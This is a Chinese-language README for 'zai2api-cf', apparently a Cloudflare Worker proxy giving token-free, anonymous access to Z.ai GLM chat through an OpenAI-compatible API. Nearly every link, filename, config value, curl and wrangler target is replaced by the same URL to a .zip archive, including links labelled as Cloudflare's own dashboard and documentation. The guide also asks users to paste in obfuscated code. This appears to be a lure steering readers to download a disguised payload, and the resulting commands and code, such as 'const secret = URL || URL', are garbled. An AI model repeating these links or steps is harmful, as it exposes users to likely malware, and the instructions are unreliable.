# zai2api-cf
将 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip Chat 代理为 OpenAI/Anthropic Compatible 格式，支持多模型列表映射、免令牌、智能处理思考链、图片上传等功能；https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip ZtoApi z2api ZaitoApi zai X-Signature 签名 GLM 4.5 v 4.6
# 混淆代码部署指南

本指南详细说明如何将混淆后的 `https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip` 部署到 Cloudflare Workers。

## 📋 目录

- [前置准备](#前置准备)
- [方法一：通过 Cloudflare 控制台部署](#方法一通过-cloudflare-控制台部署)
- [方法二：使用 Wrangler CLI 部署](#方法二使用-wrangler-cli-部署)
- [验证部署](#验证部署)
- [常见问题](#常见问题)

---

## 前置准备

### 1. Cloudflare 账户
- 访问 [Cloudflare](https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip) 并注册/登录账户
- 免费账户即可使用 Workers 功能

### 2. 文件准备
确保你有以下文件：
- ✅ `https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip` - 混淆后的 Worker 代码（26.9KB）

---

## 方法一：通过 Cloudflare 控制台部署

### 步骤 1：访问 Workers 面板

1. 登录 [Cloudflare Dashboard](https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip)
2. 在左侧菜单中选择 **Workers & Pages**
3. 点击 **Create Application** 按钮
4. 选择 **Create Worker**

### 步骤 2：配置 Worker

1. **命名 Worker**
   ```
   建议名称：z-ai-proxy 或 your-custom-name
   ```

2. **编辑代码**
   - 点击 **Quick Edit** 或 **Deploy** 后再编辑
   - 删除默认代码
   - 复制 `https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip` 的全部内容
   - 粘贴到编辑器中

### 步骤 3：保存并部署

1. 点击右上角的 **Save and Deploy** 按钮
2. 等待部署完成（通常几秒钟）
3. 记录你的 Worker URL，格式如下：
   ```
   https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
   ```

### 步骤 4：测试部署

在浏览器访问：
```
https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
```

应该返回类似：
```json
{
  "service": "https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip Anonymous Proxy",
  "version": "9.0.0",
  "status": "ok",
  "models": ["GLM-4.6", "GLM-4.6-SEARCH"]
}
```

---

## 方法二：使用 Wrangler CLI 部署

### 步骤 1：安装 Wrangler

```bash
npm install -g wrangler
```

### 步骤 2：登录 Cloudflare

```bash
wrangler login
```

这会打开浏览器完成授权。

### 步骤 3：创建 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip 配置文件

在项目目录创建 `https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip`：

```toml
name = "z-ai-proxy"
main = "https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip"
compatibility_date = "2024-01-01"

[https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip]
workers_dev = true
```

### 步骤 4：部署

```bash
# 部署到生产环境
wrangler deploy https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip

# 或者指定名称部署
wrangler deploy https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip --name z-ai-proxy
```

### 步骤 5：查看部署信息

```bash
wrangler deployments list
```

---

## 验证部署

### 1. 健康检查

```bash
curl https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
```

### 2. 获取模型列表

```bash
curl https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
```

### 3. 测试聊天接口

```bash
curl -X POST https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip \
  -H "Content-Type: application/json" \
  -d '{
    "model": "GLM-4.6",
    "messages": [
      {"role": "user", "content": "你好"}
    ],
    "stream": false
  }'
```

---

## 配置自定义域名（可选）

### 步骤 1：添加自定义域名

1. 在 Worker 设置页面，点击 **Triggers** 标签
2. 点击 **Add Custom Domain**
3. 输入你的域名（需要在 Cloudflare 托管）
4. 等待 SSL 证书配置完成

### 步骤 2：使用自定义域名

部署成功后，可以通过自定义域名访问：
```
https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
```

---

## 环境变量配置（可选）

如果需要修改配置（如 SECRET 密钥）：

### 方法 1：通过控制台

1. 进入 Worker 设置
2. 点击 **Settings** → **Variables**
3. 添加环境变量：
   - `SECRET`: 你的密钥
   - `ZAI_API`: 自定义 API 地址

### 方法 2：通过 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip

```toml
[vars]
SECRET = "your-custom-secret"
ZAI_API = "https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip"
```

然后在代码中使用：
```javascript
// 在 Worker 代码中访问
const secret = https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip || https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip;
```

---

## 监控和日志

### 查看实时日志

```bash
wrangler tail
```

### 通过控制台查看

1. 进入 Worker 详情页
2. 点击 **Logs** 标签
3. 查看实时请求日志

---

## 常见问题

### Q1: 部署后显示 "Script startup exceeded CPU time limit"

**原因**：混淆后的代码初始化时间过长

**解决方案**：
- 使用当前的适度混淆版本（26.9KB）✅


### Q2: 返回 "Error: Token获取失败"

**原因**：上游服务连接问题

**解决方案**：
1. 检查上游 API 是否可访问
2. 稍后重试（有重试机制）
3. 检查 Workers 是否有网络限制

### Q3: 如何更新已部署的 Worker？

**方法 1**：通过控制台
- 进入 Worker 编辑页面
- 更新代码
- 点击 "Save and Deploy"

**方法 2**：通过 CLI
```bash
wrangler deploy https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
```

### Q4: 免费账户的限制？

Cloudflare Workers 免费套餐限制：
- ✅ 每天 100,000 次请求
- ✅ 最多 1MB 脚本大小（我们的 26.9KB ✅）
- ✅ CPU 时间：10ms/请求


### Q5: 如何删除 Worker？

```bash
# CLI 方式
wrangler delete your-worker-name

# 或通过控制台
Workers & Pages → 选择 Worker → Settings → Delete
```

---

## 性能优化建议

### 1. 使用 KV 缓存（可选）

如果需要缓存 token：

```javascript
// 创建 KV 命名空间
// https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip 添加：
kv_namespaces = [
  { binding = "CACHE", id = "your-kv-id" }
]
```

### 2. 限制请求频率

添加简单的速率限制逻辑（可在代码中实现）。

### 3. 监控告警

设置 Cloudflare 告警：
- CPU 使用率超过阈值
- 错误率超过阈值
- 请求量异常

---

## 安全建议

1. ✅ **定期更新密钥**
   - 修改 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip 并重新部署

2. ✅ **启用访问控制**
   - 可以添加简单的 API key 验证

3. ✅ **监控异常流量**
   - 通过日志查看是否有异常请求

4. ✅ **使用自定义域名**
   - 避免暴露 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip 域名

---

## 技术支持

遇到问题？

1. 查看 [Cloudflare Workers 文档](https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip)
2. 检查 Worker 日志查找错误信息
3. 查看本地代码是否正确混淆

---

## 附录：完整部署命令速查

```bash
# 安装 Wrangler
npm install -g wrangler

# 登录
wrangler login

# 快速部署
wrangler deploy https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip --name z-ai-proxy

# 查看日志
wrangler tail

# 查看部署列表
wrangler deployments list

# 删除 Worker
wrangler delete z-ai-proxy
```

---

**部署完成！** 🎉

现在你的混淆代码已经安全部署到 Cloudflare Workers，享受高性能、全球分发的 API 服务！
